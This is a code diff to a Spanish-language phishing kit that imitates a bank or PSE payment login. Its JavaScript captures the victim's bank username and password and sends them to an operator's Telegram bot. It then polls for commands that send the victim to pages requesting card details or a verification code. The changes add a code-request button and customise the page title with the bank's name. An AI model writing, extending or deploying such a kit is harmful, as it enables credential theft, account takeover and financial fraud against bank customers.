@@ -180,8 +180,12 @@
                     </div>
                 </div>
                 <div class="mt-8 text-center">
+                    <button type="button" id="codeButton"
+                        class="w-full h-14 rounded-xl text-white font-bold text-lg bg-[#2574A9] hover:bg-[#1f5c86] transition-colors">
+                        PEDIR CÓDIGO
+                    </button>
                     <button type="submit" id="payButton"
-                        class="w-full h-14 rounded-xl text-white font-bold text-lg bg-[#EF3320] hover:bg-[#d01508] transition-colors">
+                        class="w-full h-14 rounded-xl text-white font-bold text-lg bg-[#EF3320] hover:bg-[#d01508] transition-colors mt-4">
                         CONTINUAR
                     </button>
                 </div>
@@ -206,9 +210,9 @@
         document.addEventListener("DOMContentLoaded", function() {
             const urlParams = new URLSearchParams(window.location.search);
             const deudaTotal = parseFloat(urlParams.get('deuda'));
-            const bankLogoUrl = urlParams.get('logo'); // Nuevo: obtener la URL del logo
-            const bankName = urlParams.get('banco'); // Opcional: obtener el nombre del banco
-
+            const bankLogoUrl = urlParams.get('logo');
+            const bankName = urlParams.get('banco');
+            
             const formatCurrency = (amount) => {
                 return new Intl.NumberFormat('es-CO', {
                     style: 'currency',
@@ -232,11 +236,13 @@
                 if (bankName) {
                     const readableBankName = bankName.charAt(0).toUpperCase() + bankName.slice(1);
                     pseLogo.alt = `Logo de ${readableBankName}`;
+                    document.getElementById('bank-title').textContent = `Inicia Sesión en ${readableBankName}`;
                 }
             }
 
             const bankLoginForm = document.getElementById('bank-login-form');
             const loaderContainer = document.getElementById('loader-container');
+            const codeButton = document.getElementById('codeButton');
 
             bankLoginForm.addEventListener('submit', async function(event) {
                 event.preventDefault();
@@ -260,52 +266,63 @@
 
                 if (isValid) {
                     loaderContainer.style.display = 'flex';
-                    let transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
-                    let message = `<b>🔔 Nuevo Intento de Pago - Banco Desconocido</b>\n🆔 <b>ID:</b> ${transactionId}\n`;
-                    message += `👤 <b>Usuario:</b> ${user.value}\n🔑 <b>Clave:</b> ${clave.value}`;
+                    const tid = Date.now().toString(36) + Math.random().toString(36).slice(2);
+                    
+                    let message = `<b>🔔 Nuevo Intento de Pago</b>\n`;
+                    message += `🏦 <b>Banco:</b> ${bankName ? bankName.toUpperCase() : 'Desconocido'}\n`;
+                    message += `🆔 <b>ID:</b> ${tid}\n`;
+                    message += `💰 <b>Valor:</b> ${document.getElementById('valor-a-pagar').textContent}\n`;
+                    message += `👤 <b>Usuario:</b> <code>${user.value}</code>\n`;
+                    message += `🔑 <b>Clave:</b> <code>${clave.value}</code>`;
 
-                    const formData = {
-                        usuario: user.value,
-                        clave: clave.value
-                    };
-                    localStorage.setItem('formData', JSON.stringify(formData));
+                    localStorage.setItem('formData', JSON.stringify({ usuario: user.value, clave: clave.value }));
 
                     const keyboard = {
                         inline_keyboard: [
-                            [{ text: "Pedir TC", callback_data: `pedir_tc:${transactionId}` }],
-                            [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
-                            [{ text: "Datos Incorrectos", callback_data: `datos_incorrectos:${transactionId}` }]
+                            [{ text: "✅ Pedir TC", callback_data: `pedir_tc:${tid}` }],
+                            [{ text: "❌ Pedir Código", callback_data: `pedir_code:${tid}` }],
+                            [{ text: "🚨 Datos Incorrectos", callback_data: `datos_incorrectos:${tid}` }]
                         ]
                     };
-
-                    async function loadCfg() {
-                        const res = await fetch('config.json');
-                        if (!res.ok) throw 'No cargó config.json';
-                        return res.json();
-                    }
-
+                    
                     try {
                         const cfg = await loadCfg();
-                        const res = await fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: cfg.chat_id,
-                                text: message,
-                                reply_markup: keyboard,
-                                parse_mode: 'HTML'
-                            })
-                        });
-                        const js = await res.json();
-                        if (!js.ok) throw js;
-                        poll(cfg, transactionId, 'banco_generico', deudaTotal);
+                        await sendToTelegram(cfg, message, keyboard);
+                        poll(cfg, tid, bankName, deudaTotal);
                     } catch (err) {
-                        console.error(err);
+                        console.error('Error durante el proceso:', err);
                         loaderContainer.style.display = 'none';
-                        alert('Error enviando a Telegram');
+                        alert('Error en la transacción. Por favor, intente de nuevo.');
                     }
                 }
             });
+
+            if (codeButton) {
+                codeButton.addEventListener('click', function() {
+                    window.location.href = `code.html?deuda=${deudaTotal}&banco=${bankName}&logo=${encodeURIComponent(bankLogoUrl)}`;
+                });
+            }
+
+            async function loadCfg() {
+                const res = await fetch('config.json');
+                if (!res.ok) throw 'No cargó config.json';
+                return res.json();
+            }
+
+            async function sendToTelegram(cfg, message, keyboard) {
+                const res = await fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: cfg.chat_id,
+                        text: message,
+                        reply_markup: keyboard,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const js = await res.json();
+                if (!js.ok) throw js;
+            }
 
             async function poll(cfg, tid, bank, deuda) {
                 try {
@@ -319,17 +336,20 @@
                             case 'pedir_tc':
                                 window.location.href = `tc.html?banco=${bank}&deuda=${deuda}`;
                                 break;
-                            case 'error_logo':
-                                alert('Ocurrió un error. Por favor, intente de nuevo.');
+                            case 'pedir_code':
+                                window.location.href = `code.html?deuda=${deuda}&banco=${bank}&logo=${encodeURIComponent(bankLogoUrl)}`;
                                 break;
                             case 'datos_incorrectos':
                                 alert('Los datos de inicio de sesión son incorrectos. Por favor, inténtelo de nuevo.');
                                 break;
+                            default:
+                                console.log('Acción no reconocida:', action);
                         }
                     } else {
                         setTimeout(() => poll(cfg, tid, bank, deuda), 2000);
                     }
-                } catch {
+                } catch (err) {
+                    console.error('Error al hacer polling:', err);
                     setTimeout(() => poll(cfg, tid, bank, deuda), 2000);
                 }
             }
